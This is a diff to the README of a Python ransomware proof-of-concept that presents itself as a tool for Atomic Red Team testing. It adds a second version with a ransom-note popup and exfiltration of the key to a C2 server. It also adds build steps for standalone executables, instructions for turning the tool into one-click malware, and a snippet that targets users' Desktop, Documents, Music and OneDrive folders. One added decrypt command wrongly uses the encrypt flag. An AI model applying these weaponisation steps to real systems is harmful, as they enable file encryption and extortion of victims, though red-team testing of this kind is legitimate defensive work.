@@ -12,6 +12,19 @@ A simple python ransomware PoC that can be used for Atomic Red Team testing for 
 * python3 (python2 for Linux/macOS should work)
 * Windows, Linux and macOS
 
+# Versions
+There are two versions:
+
+Version 1: main.py
+- Basic version
+- Works with Windows, Linux and macOS
+
+Version 2: main_v2.py
+- Advanced version
+- Only works with Windows and Linux (no tkinter on macOS)
+- Ransom note pop up
+- Exfiltrate key back to C2 given domain and port
+
 # How to run
 Install dependencies:
 ```bash
@@ -20,17 +33,23 @@ pip3 install pycryptodome
 
 Default:
 ```
-Encrypt: python3 main.py -e
-Decrypt: python3 main.py -d
+Encrypt: python3 main.py -e or python3 main_v2.py -e
+Decrypt: python3 main.py -d or python3 main_v2.py -e
 ```
 
 Windows with specific path:
 ```
-Encrypt: python3 main.py -p "C:\users\jimmy\desktop\test_ransomware" -e
-Decrypt: python3 main.py -p "C:\users\jimmy\desktop\test_ransomware" -d
+Encrypt: python3 main_v2.py -p "C:\users\jimmy\desktop\test_ransomware" -e
+Decrypt: python3 main_v2.py -p "C:\users\jimmy\desktop\test_ransomware" -d
 ```
 
-Linux / macOS with specific path:
+Linux with specific path:
+```
+Encrypt: python3 main_v2.py -p "/home/jimmy/test_ransomware" -e
+Decrypt: python3 main_v2.py -p "/home/jimmy/test_ransomware" -d
+```
+
+macOS with specific path:
 ```
 Encrypt: python3 main.py -p "/home/jimmy/test_ransomware" -e
 Decrypt: python3 main.py -p "/home/jimmy/test_ransomware" -d
@@ -47,7 +66,7 @@ Tested with python 2.7 with pyinstaller 3.6 and python 3.7 with pyinstaller 4.0.
 Windows and Linux:
 ```bash
 pip3 install pyinstaller
-pyinstaller --onefile main.py or py -m PyInstaller --onefile main.py
+pyinstaller --onefile main_v2.py or py -m PyInstaller --onefile main_v2.py
 ```
 
 macOS:
@@ -65,14 +84,14 @@ See `/bin` folder for binaries.
 
 Windows with specific path:
 ```
-Encrypt: main.exe -p "C:\users\jimmy\desktop\test_ransomware" -e
-Decrypt: main.exe -p "C:\users\jimmy\desktop\test_ransomware" -d
+Encrypt: main_v2.exe -p "C:\users\jimmy\desktop\test_ransomware" -e
+Decrypt: main_v2.exe -p "C:\users\jimmy\desktop\test_ransomware" -d
 ```
 
 Linux with specific path:
 ```
-Encrypt: ./main -p "/home/jimmy/test_ransomware" -e
-Decrypt: ./main -p "/home/jimmy/test_ransomware" -d
+Encrypt: ./main_v2 -p "/home/jimmy/test_ransomware" -e
+Decrypt: ./main_v2 -p "/home/jimmy/test_ransomware" -d
 ```
 
 macOS with specific path:
@@ -81,14 +100,59 @@ Encrypt: ./main_macos_py2 -p "/Users/jimmy/test_ransomware" -e
 Decrypt: ./main_macos_py2 -p "/Users/jimmy/test_ransomware" -d
 ```
 
+## Miscellaneous 
+### One-click execution
+
+I originally added arguments to prevent accidental clicks and mess up. To simulate a one-click malware, comment and uncomment the following:
+
+Comment
+```
+if len(sys.argv) <= 1:
+    print('[*] Ransomware - PoC\n')
+    # banner()        
+    print('Usage: python3 main.py -h')
+    print('{} -h for help.'.format(sys.argv[0]))
+    exit(0)
+
+# Parse arguments
+args = parse_args()
+encrypt = args.encrypt
+decrypt = args.decrypt
+
+absolute_path = str(args.path)
+ ```   
+
+Uncomment
+```
+absolute_path = "None"
+encrypt = True 
+decrypt = False
+```
+
+### Multiple folders
+There is support for multiple paths, add them as such:
+
+```
+startdirs = [os.environ['USERPROFILE'] + '\\Desktop', 
+                        os.environ['USERPROFILE'] + '\\Documents',
+                        os.environ['USERPROFILE'] + '\\Music',
+                        os.environ['USERPROFILE'] + '\\Desktop',
+                        os.environ['USERPROFILE'] + '\\Onedrive']
+```
+
 # Demo
 ![Ransomware-PoC](/demo/download.gif)
+
+![main_v2-PoC](/demo/main_v2.png)
+
 
 # Additional Features
 * Added RSA asymmetric encryption of the AES key.
 * Added autodetection on Windows, Linux or macOS.
 * Added path argument to specify a directory.
 * Fixed handling of renaming files with adding/removing of the ransomware extension.
+* Added ransomware note pop up.
+* Added exfiltration of key back to C2.
 
 # Credit
 - [CryptSky](https://github.com/deadPix3l/CryptSky) (deadPix3l and contributers) for base project
